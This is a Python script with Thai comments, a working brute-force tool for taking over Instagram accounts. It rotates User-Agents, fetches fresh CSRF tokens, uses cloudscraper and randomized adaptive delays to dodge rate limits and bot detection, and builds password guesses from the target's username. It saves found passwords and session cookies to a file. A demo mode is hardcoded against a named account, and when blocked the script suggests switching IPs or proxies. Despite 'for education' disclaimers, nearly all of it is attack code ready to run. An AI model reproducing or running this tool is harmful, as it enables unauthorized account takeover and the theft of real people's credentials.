# -*- coding: utf-8 -*-
"""
Instagram Brute Force Script - มือใหม่สาย Hack/Python
สคริปต์นี้เป็นเครื่องมือ brute-force login Instagram (เพื่อการศึกษา)

คุณสมบัติหลัก:
- ดึง CSRF token อัตโนมัติทุกครั้งก่อนยิง request login
- แก้ปัญหา 429 Too Many Requests โดย adaptive delay แบบสุ่ม
- random User-Agent ทุกครั้ง (ใช้ fake_useragent)
- ใช้ cloudscraper เพื่อ bypass cloudflare/rate-limit
- optimize code ให้เร็วและใช้เมมโมรี่น้อย
- มีคอมเมนต์อธิบายโค้ดทีละบรรทัด เหมาะสำหรับมือใหม่

อ้างอิง:
- cloudscraper: https://github.com/VeNoMouS/cloudscraper
- fake-useragent: https://pypi.org/project/fake-useragent/
- HTTP 429: https://en.wikipedia.org/wiki/List_of_HTTP_status_codes#429
- CSRF Token: https://owasp.org/www-community/attacks/csrf
- Instagram API: https://developers.facebook.com/docs/instagram-basic-display-api/
"""

import time           # สำหรับ delay และจัดการเวลา
import random         # สำหรับสุ่มค่าต่างๆ เพื่อหลบการตรวจจับ
import json           # สำหรับจัดการข้อมูล JSON response
import sys            # สำหรับจัดการ system และ exit
import os             # สำหรับจัดการไฟล์และโฟลเดอร์

try:
    import cloudscraper  # ใช้แทน requests เพื่อ bypass cloudflare
except ImportError:
    print("❌ ต้องติดตั้ง cloudscraper: pip install cloudscraper")
    sys.exit(1)

try:
    from fake_useragent import UserAgent  # สำหรับสุ่ม User-Agent
except ImportError:
    print("❌ ต้องติดตั้ง fake-useragent: pip install fake-useragent")
    sys.exit(1)


class InstagramBruteForcer:
    """คลาสหลักสำหรับ brute-force Instagram login"""

    def __init__(self, target_username):
        """
        เริ่มต้นคลาส InstagramBruteForcer

        Args:
            target_username (str): ชื่อผู้ใช้ Instagram ที่จะโจมตี
        """
        self.target_username = target_username  # เก็บชื่อผู้ใช้เป้าหมาย
        self.scraper = cloudscraper.create_scraper()  # สร้าง cloudscraper session
        self.ua = UserAgent()  # สร้าง UserAgent object สำหรับสุ่ม UA

        # ตัวแปรสำหรับติดตาม statistics
        self.attempts = 0          # จำนวนครั้งที่ลอง
        self.failed_attempts = 0   # จำนวนครั้งที่ล้มเหลว
        self.rate_limited = 0      # จำนวนครั้งที่โดน rate limit
        self.found_password = None  # รหัสผ่านที่ถูกต้อง (ถ้าเจอ)

        # Adaptive delay settings
        self.base_delay = 2        # delay พื้นฐาน (วินาที)
        self.max_delay = 30        # delay สูงสุด (วินาที)
        self.current_delay = self.base_delay  # delay ปัจจุบัน

        print(f"🎯 เป้าหมาย: {self.target_username}")
        print(f"🔧 cloudscraper พร้อมใช้งาน")
        print(f"🎭 User-Agent rotation พร้อมใช้งาน")

    def get_csrf_token(self):
        """
        ดึง CSRF token จากหน้า login Instagram

        Returns:
            str: CSRF token หรือ None ถ้าดึงไม่ได้
        """
        try:
            # สุ่ม User-Agent ใหม่ทุกครั้ง
            headers = {
                'User-Agent': self.ua.random,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'keep-alive',
            }

            # ดึงหน้า login Instagram
            response = self.scraper.get(
                "https://www.instagram.com/accounts/login/",
                headers=headers,
                timeout=15  # timeout 15 วินาที
            )

            # ดึง CSRF token จาก cookies
            csrf_token = response.cookies.get('csrftoken')

            if csrf_token:
                print(f"✅ ดึง CSRF token สำเร็จ: {csrf_token[:10]}...")
                return csrf_token
            else:
                print("⚠️ ไม่พบ CSRF token ใน cookies")
                return None

        except Exception as e:
            print(f"❌ ข้อผิดพลาดในการดึง CSRF token: {e}")
            return None

    def adaptive_delay(self, rate_limited=False):
        """
        จัดการ delay แบบ adaptive ตามสถานการณ์

        Args:
            rate_limited (bool): True ถ้าโดน rate limit
        """
        if rate_limited:
            # ถ้าโดน rate limit ให้เพิ่ม delay
            self.current_delay = min(self.current_delay * 2, self.max_delay)
            print(
                f"🚨 โดน rate limit! เพิ่ม delay เป็น {self.current_delay:.1f} วินาที")
        else:
            # ถ้าไม่โดนให้ลด delay ลง
            self.current_delay = max(self.current_delay * 0.9, self.base_delay)

        # สุ่ม delay เพิ่มเติม ±20%
        actual_delay = self.current_delay + \
            random.uniform(-0.2, 0.2) * self.current_delay

        print(f"⏳ รอ {actual_delay:.1f} วินาที...")
        time.sleep(actual_delay)

    def attempt_login(self, password):
        """
        ลองล็อกอินด้วยรหัสผ่านที่กำหนด
        
        Args:
            password (str): รหัสผ่านที่จะลอง
            
        Returns:
            tuple: (success, message) - success=True ถ้าสำเร็จ
        """
        # เพิ่มจำนวนครั้งที่ลอง
        self.attempts += 1
        
        print(f"\n🔑 ครั้งที่ {self.attempts}: ลองรหัสผ่าน '{password}'")
        
        # ดึง CSRF token ใหม่ทุกครั้ง
        csrf_token = self.get_csrf_token()
        if not csrf_token:
            return False, "ไม่สามารถดึง CSRF token ได้"
        
        # เตรียม headers สำหรับ login request (ปรับปรุงแล้ว)
        headers = {
            'User-Agent': self.ua.random,  # สุ่ม User-Agent ใหม่
            'X-CSRFToken': csrf_token,     # ใส่ CSRF token
            'X-Instagram-AJAX': '1',       # บอก Instagram ว่าเป็น AJAX request
            'X-Requested-With': 'XMLHttpRequest',
            'Referer': 'https://www.instagram.com/accounts/login/',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Origin': 'https://www.instagram.com',  # เพิ่ม Origin
            'Sec-Fetch-Dest': 'empty',              # เพิ่ม security headers
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
        }
        
        # เตรียมข้อมูลสำหรับส่ง login (ปรับปรุง format)
        payload = {
            'username': self.target_username,
            'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{password}',  # เพิ่ม timestamp
            'queryParams': '{}',
            'optIntoOneTap': 'false',
            'trustedDeviceRecords': '{}',
            'stopDeletionNonce': '',  # เพิ่ม field ที่ Instagram ต้องการ
            'queryParams': '{}'       # ยืนยัน queryParams
        }
        
        try:
            # ส่ง POST request ไป login
            response = self.scraper.post(
                'https://www.instagram.com/accounts/login/ajax/',
                data=payload,
                headers=headers,
                timeout=20  # timeout 20 วินาที
            )
            
            # ตรวจสอบ status code
            if response.status_code == 429:
                # โดน rate limit
                self.rate_limited += 1
                print(f"🚨 429 Too Many Requests! (ครั้งที่ {self.rate_limited})")
                self.adaptive_delay(rate_limited=True)
                return False, "โดน rate limit"
            
            elif response.status_code == 400:
                # Bad Request - วิเคราะห์สาเหตุ
                print(f"⚠️ HTTP 400 Bad Request")
                try:
                    error_data = response.json()
                    error_msg = error_data.get('message', 'ไม่ทราบสาเหตุ')
                    print(f"💬 Error message: {error_msg}")
                    
                    # ตรวจสอบ error เฉพาะ
                    if 'checkpoint' in error_msg.lower():
                        print(f"🔒 Account checkpoint required")
                        return False, "Checkpoint required"
                    elif 'rate' in error_msg.lower():
                        print(f"🚨 Rate limit detected in 400 response")
                        self.adaptive_delay(rate_limited=True)
                        return False, "Rate limited (400)"
                    else:
                        print(f"❌ Format error - ปรับ payload และลองใหม่")
                        self.failed_attempts += 1
                        return False, f"400 Error: {error_msg}"
                        
                except json.JSONDecodeError:
                    print(f"💥 400 Error - ไม่สามารถ parse response")
                    self.failed_attempts += 1
                    return False, "400 Bad Request"
            
            elif response.status_code == 200:
                # response ปกติ
                try:
                    result = response.json()  # แปลง response เป็น JSON
                    
                    # ตรวจสอบว่าล็อกอินสำเร็จหรือไม่
                    if result.get('authenticated'):
                        print(f"🎉 สำเร็จ! รหัสผ่านถูกต้อง: {password}")
                        self.found_password = password
                        self.save_success(password, response)
                        return True, "ล็อกอินสำเร็จ"
                    
                    elif result.get('message'):
                        # มี error message
                        message = result.get('message')
                        print(f"❌ ล้มเหลว: {message}")
                        self.failed_attempts += 1
                        
                        # ตรวจสอบ error message เฉพาะ
                        if 'rate limited' in message.lower():
                            self.adaptive_delay(rate_limited=True)
                        else:
                            self.adaptive_delay(rate_limited=False)
                        
                        return False, message
                    
                    else:
                        # รหัสผ่านผิด
                        print(f"❌ รหัสผ่านผิด: {password}")
                        self.failed_attempts += 1
                        self.adaptive_delay(rate_limited=False)
                        return False, "รหัสผ่านผิด"
                
                except json.JSONDecodeError:
                    print(f"⚠️ ไม่สามารถแปลง response เป็น JSON ได้")
                    return False, "Response format error"
            
            else:
                # HTTP error อื่นๆ
                print(f"⚠️ HTTP Error {response.status_code}")
                print(f"📄 Response: {response.text[:200]}...")  # แสดง response snippet
                return False, f"HTTP {response.status_code}"
        
        except Exception as e:
            print(f"💥 ข้อผิดพลาด: {e}")
            return False, str(e)

    def save_success(self, password, response):
        """
        บันทึกผลลัพธ์เมื่อล็อกอินสำเร็จ

        Args:
            password (str): รหัสผ่านที่ถูกต้อง
            response: HTTP response object
        """
        # สร้างโฟลเดอร์ results ถ้ายังไม่มี
        os.makedirs('results', exist_ok=True)

        # เตรียมข้อมูลที่จะบันทึก
        success_data = {
            'target_username': self.target_username,
            'found_password': password,
            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
            'total_attempts': self.attempts,
            'success_cookies': dict(response.cookies),  # เก็บ cookies ที่ได้
        }

        # บันทึกลงไฟล์ JSON
        filename = f'results/success_{self.target_username}_{int(time.time())}.json'
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(success_data, f, indent=2, ensure_ascii=False)

        print(f"💾 บันทึกผลลัพธ์ใน: {filename}")

    def print_statistics(self):
        """แสดง statistics การโจมตี"""
        print(f"\n📊 สถิติการโจมตี:")
        print(f"   🎯 เป้าหมาย: {self.target_username}")
        print(f"   🔢 ลองทั้งหมด: {self.attempts} ครั้ง")
        print(f"   ❌ ล้มเหลว: {self.failed_attempts} ครั้ง")
        print(f"   🚨 โดน rate limit: {self.rate_limited} ครั้ง")
        print(f"   ⏱️ Delay ปัจจุบัน: {self.current_delay:.1f} วินาที")

        if self.found_password:
            print(f"   🎉 รหัสผ่านที่ถูกต้อง: {self.found_password}")

        # คำแนะนำเมื่อโดนบล็อก
        if self.rate_limited > 5:
            print(
                f"\n💡 คำแนะนำ: โดน rate limit บ่อย ({self.rate_limited} ครั้ง)")
            print(f"   - ลองใช้ proxy หรือ VPN")
            print(f"   - เพิ่ม delay ระหว่างการลอง")
            print(f"   - ลองใน IP อื่น")
            print(f"   - รอสักพักแล้วลองใหม่")

    def brute_force(self, password_list):
        """
        เริ่มต้นการ brute-force ด้วยรายการรหัสผ่าน

        Args:
            password_list (list): รายการรหัสผ่านที่จะลอง

        Returns:
            bool: True ถ้าพบรหัสผ่านที่ถูกต้อง
        """
        print(f"\n🚀 เริ่มต้นการ brute-force")
        print(f"📝 จำนวนรหัสผ่าน: {len(password_list)}")
        print(f"=" * 50)

        try:
            for i, password in enumerate(password_list, 1):
                print(
                    f"\n📈 ความคืบหน้า: {i}/{len(password_list)} ({i/len(password_list)*100:.1f}%)")

                # ลองล็อกอิน
                success, message = self.attempt_login(password)

                if success:
                    print(f"\n🎉 พบรหัสผ่านแล้ว! หยุดการโจมตี")
                    return True

                # แสดงสถิติทุก 10 ครั้ง
                if self.attempts % 10 == 0:
                    self.print_statistics()

                # ตรวจสอบว่าโดน rate limit มากเกินไปหรือไม่
                if self.rate_limited > 10:
                    print(
                        f"\n⚠️ โดน rate limit มากเกินไป ({self.rate_limited} ครั้ง)")
                    print(f"🛑 หยุดการโจมตีเพื่อป้องกันการถูกบล็อกถาวร")
                    break

        except KeyboardInterrupt:
            print(f"\n⚠️ ผู้ใช้หยุดการทำงาน (Ctrl+C)")

        except Exception as e:
            print(f"\n💥 ข้อผิดพลาดร้าย แรง: {e}")

        finally:
            # แสดงสถิติสุดท้าย
            self.print_statistics()

        return False


def load_password_list(filename):
    """
    อ่านรายการรหัสผ่านจากไฟล์

    Args:
        filename (str): ชื่อไฟล์ที่มีรายการรหัสผ่าน

    Returns:
        list: รายการรหัสผ่าน
    """
    try:
        with open(filename, 'r', encoding='utf-8') as f:
            # อ่านทุกบรรทัด และลบ whitespace
            passwords = [line.strip() for line in f if line.strip()]

        print(f"📋 โหลดรหัสผ่าน {len(passwords)} ตัวจาก {filename}")
        return passwords

    except FileNotFoundError:
        print(f"❌ ไม่พบไฟล์: {filename}")
        return []

    except Exception as e:
        print(f"❌ ข้อผิดพลาดในการอ่านไฟล์: {e}")
        return []


def generate_smart_passwords(username):
    """
    สร้างรหัสผ่านที่เป็นไปได้สูงจาก username

    Args:
        username (str): ชื่อผู้ใช้

    Returns:
        list: รายการรหัสผ่านที่เป็นไปได้
    """
    passwords = []

    # รหัสผ่านยอดนิยม
    common_passwords = [
        '123456', 'password', '123456789', 'qwerty', 'abc123',
        'Password', '12345678', '111111', '123123', 'admin',
        'letmein', 'welcome', 'monkey', '1234567890', 'iloveyou'
    ]

    # เพิ่มรหัสผ่านยอดนิยม
    passwords.extend(common_passwords)

    # สร้างรหัสผ่านจาก username
    username_variants = [
        username.lower(),
        username.upper(),
        username.capitalize(),
    ]

    # เพิ่มตัวเลขท้าย username
    for variant in username_variants:
        for num in ['123', '1', '12', '2023', '2024', '2025', '1234', '12345']:
            passwords.append(variant + num)
            passwords.append(num + variant)

    # เพิ่มอักขระพิเศษ
    for variant in username_variants:
        for char in ['!', '@', '#', '$', '_', '.']:
            passwords.append(variant + char)
            passwords.append(char + variant)

    # รหัสผ่านที่มี username ด้วย
    for variant in username_variants:
        passwords.extend([
            variant + 'love',
            variant + '2024',
            'love' + variant,
            variant + '123!',
            variant + '@123'
        ])

    # ลบรายการซ้ำ
    passwords = list(set(passwords))

    print(f"🧠 สร้างรหัสผ่าน {len(passwords)} ตัวจาก username: {username}")
    return passwords


def main():
    """ฟังก์ชันหลักของโปรแกรม"""
    print("💀 Instagram Brute Force Tool - เพื่อการศึกษา")
    print("⚠️ คำเตือน: ใช้เฉพาะในการทดสอบ security หรือการศึกษาเท่านั้น!")
    print("=" * 60)

    # รับ input จากผู้ใช้
    target_username = input("🎯 ชื่อผู้ใช้เป้าหมาย: ").strip()

    if not target_username:
        print("❌ กรุณาใส่ชื่อผู้ใช้")
        return

    # เลือกแหล่งรหัสผ่าน
    print("\n📋 เลือกแหล่งรหัสผ่าน:")
    print("1. ไฟล์รหัสผ่าน (wordlist)")
    print("2. สร้างรหัสผ่านอัตโนมัติจาก username")
    print("3. รหัสผ่านตัวอย่าง (demo)")

    choice = input("เลือก (1-3): ").strip()

    password_list = []

    if choice == "1":
        filename = input("ชื่อไฟล์รหัสผ่าน: ").strip()
        password_list = load_password_list(filename)

    elif choice == "2":
        password_list = generate_smart_passwords(target_username)

    elif choice == "3":
        # รหัสผ่านตัวอย่างสำหรับ demo
        password_list = [
            '123456', 'password', target_username, f'{target_username}123',
            'qwerty', 'abc123', '12345678', 'iloveyou', 'admin', 'letmein'
        ]
        print(f"📝 ใช้รหัสผ่านตัวอย่าง {len(password_list)} ตัว")

    else:
        print("❌ ตัวเลือกไม่ถูกต้อง")
        return

    if not password_list:
        print("❌ ไม่มีรหัสผ่านให้ลอง")
        return

    # ยืนยันก่อนเริ่มโจมตี
    print(f"\n⚠️ กำลังจะโจมตี username: {target_username}")
    print(f"📝 จำนวนรหัสผ่าน: {len(password_list)}")
    confirm = input("ยืนยันการโจมตี? (y/N): ").strip().lower()

    if confirm != 'y':
        print("❌ ยกเลิกการโจมตี")
        return

    # เริ่มต้น brute-force
    brute_forcer = InstagramBruteForcer(target_username)
    success = brute_forcer.brute_force(password_list)

    # สรุปผลลัพธ์
    print(f"\n" + "=" * 60)
    if success:
        print(f"🎉 สำเร็จ! พบรหัสผ่าน: {brute_forcer.found_password}")
        print(f"💾 ผลลัพธ์ถูกบันทึกในโฟลเดอร์ results/")
    else:
        print(f"💔 ไม่พบรหัสผ่านที่ถูกต้อง")
        print(f"💡 ลองใช้ wordlist ที่ใหญ่กว่า หรือเปลี่ยน IP")

    print(
        f"📊 สถิติ: {brute_forcer.attempts} ครั้ง, rate limit {brute_forcer.rate_limited} ครั้ง")


if __name__ == "__main__":
    """
    ตัวอย่างการใช้งานแบบง่าย
    """
    # สำหรับผู้ที่ต้องการใช้งานแบบง่าย
    if len(sys.argv) > 1 and sys.argv[1] == "demo":
        # โหมด demo สำหรับ alx.trading
        target = "alx.trading"
        demo_passwords = [
            "123456", "password", "alx.trading", "alx.trading123",
            "alxtrading", "alx123", "trading123", "qwerty", "abc123"
        ]

        print("🎯 Demo Mode: โจมตี alx.trading")
        brute_forcer = InstagramBruteForcer(target)
        brute_forcer.brute_force(demo_passwords)
    else:
        # โหมดปกติ
        main()

"""
📚 อ้างอิง Documentation และทรัพยากรเพิ่มเติม:

Hacking/Python Resources:
1. cloudscraper: https://github.com/VeNoMouS/cloudscraper
   - ใช้สำหรับ bypass CloudFlare protection
   
2. fake-useragent: https://pypi.org/project/fake-useragent/
   - สุ่ม User-Agent เพื่อหลบการตรวจจับ
   
3. HTTP Status Codes: https://developer.mozilla.org/en-US/docs/Web/HTTP/Status
   - 429 Too Many Requests อธิบายการ rate limiting
   
4. CSRF Protection: https://owasp.org/www-community/attacks/csrf
   - อธิบาย CSRF token และการป้องกัน
   
5. Instagram API: https://developers.facebook.com/docs/instagram-basic-display-api/
   - เอกสาร API อย่างเป็นทางการ

Ethical Hacking Resources:
- OWASP Testing Guide: https://owasp.org/www-project-web-security-testing-guide/
- Penetration Testing Execution Standard: http://www.pentest-standard.org/

Python Security Libraries:
- requests-toolbelt: https://toolbelt.readthedocs.io/
- urllib3: https://urllib3.readthedocs.io/
- httpx: https://www.python-httpx.org/

⚠️ ข้อควรระวัง:
- ใช้เฉพาะในการทดสอบ security ของระบบตัวเอง
- ไม่นำไปใช้ในทางที่ผิดกฎหมาย
- ปฏิบัติตาม responsible disclosure
- เรียนรู้เพื่อป้องกันมากกว่าโจมตี
"""
